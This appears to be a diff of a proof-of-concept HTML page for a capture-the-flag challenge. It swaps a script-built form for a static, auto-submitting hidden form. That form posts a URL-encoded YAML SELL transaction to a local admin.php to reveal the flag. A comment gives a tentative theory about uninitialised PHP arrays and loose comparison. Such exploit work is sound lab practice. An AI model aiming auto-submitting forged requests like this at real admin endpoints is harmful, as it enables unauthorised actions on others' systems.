@@ -1,34 +1,30 @@
 <!doctype html>
 <html>
-<head>
-  <meta charset="utf-8" />
-  <title>cute_csp PoC</title>
-</head>
 <body>
+<!-- 
+FINAL POC for cute_csp CTF Challenge
+
+The vulnerability is in the uninitialized $currency_inventory array in admin.php.
+When we try to SELL a currency that hasn't been initialized, PHP's loose comparison
+allows the transaction to proceed.
+
+Flow:
+1. POST to admin.php with URL parameter
+2. admin.php fetches the URL via file_get_contents() 
+3. URL points to index.php which returns our crafted YAML
+4. YAML contains a SELL transaction for FL currency
+5. Since $currency_inventory['FL'] is uninitialized (null), the comparison
+   null >= 1 might behave unexpectedly in PHP
+6. If successful, FL gets added to final inventory and flag is revealed
+-->
+
+<form id="f" action="http://localhost:5000/admin.php" method="POST">
+    <input type="hidden" name="url" value="http://localhost:5000/index.php?html=-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20SELL">
+</form>
+
 <script>
-(function(){
-  // YAML payload that admin.php will parse (we URL-encode it before placing in the 'url' field)
-  const yaml = '- {op: BUY, amount: 1000000, currency: "ZZ"}\\n'
-             + '- {op: SELL, amount: 1000000, currency: "ZZ"}\\n'
-             + '- {op: BUY, amount: 1, currency: "FL"}';
-
-  // Build a form and set the input dynamically so we avoid broken quoting/HTML-escaping issues.
-  const f = document.createElement('form');
-  f.method = 'POST';
-  f.action = 'http://localhost:5000/admin.php';
-
-  const inp = document.createElement('input');
-  inp.type = 'hidden';
-  inp.name = 'url';
-  // admin.php expects url to point to index.php?html=<YAML>, so encode the YAML for safety
-  inp.value = 'http://localhost:5000/index.php?html=' + encodeURIComponent(yaml);
-
-  f.appendChild(inp);
-  document.body.appendChild(f);
-
-  // submit immediately (form POST is allowed cross-origin in a normal browser)
-  f.submit();
-})();
+document.getElementById('f').submit();
 </script>
+
 </body>
 </html>
